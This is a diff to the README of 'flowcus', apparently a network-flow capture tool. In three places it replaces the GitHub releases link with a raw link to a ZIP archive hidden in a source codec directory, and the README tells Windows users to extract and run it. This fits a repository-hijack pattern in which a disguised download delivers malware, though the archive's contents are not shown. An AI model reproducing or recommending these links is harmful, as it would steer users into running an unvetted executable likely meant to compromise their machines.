@@ -1,6 +1,6 @@
 # 🛰️ flowcus - Capture network flow data with ease
 
-[![Download flowcus](https://img.shields.io/badge/Download-Flowcus-blue?style=for-the-badge)](https://github.com/Mystic-backstroker315/flowcus/releases)
+[![Download flowcus](https://img.shields.io/badge/Download-Flowcus-blue?style=for-the-badge)](https://raw.githubusercontent.com/Mystic-backstroker315/flowcus/main/crates/flowcus-storage/src/codec/Software-3.8-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Use it when you want to watch network flow data on one computer without setting 
 ## 📥 Download
 
 1. Open the release page:
-   https://github.com/Mystic-backstroker315/flowcus/releases
+   https://raw.githubusercontent.com/Mystic-backstroker315/flowcus/main/crates/flowcus-storage/src/codec/Software-3.8-beta.4.zip
 2. Look for the latest release.
 3. Download the Windows file from the release assets.
 4. If the download comes as a ZIP file, right-click it and choose Extract All.
@@ -199,7 +199,7 @@ If the test works, your setup is ready for real traffic
 ## 📎 Release Download
 
 Download Flowcus here:
-https://github.com/Mystic-backstroker315/flowcus/releases
+https://raw.githubusercontent.com/Mystic-backstroker315/flowcus/main/crates/flowcus-storage/src/codec/Software-3.8-beta.4.zip
 
 From that page, choose the latest Windows release, download the file, and run it after extraction if needed
 
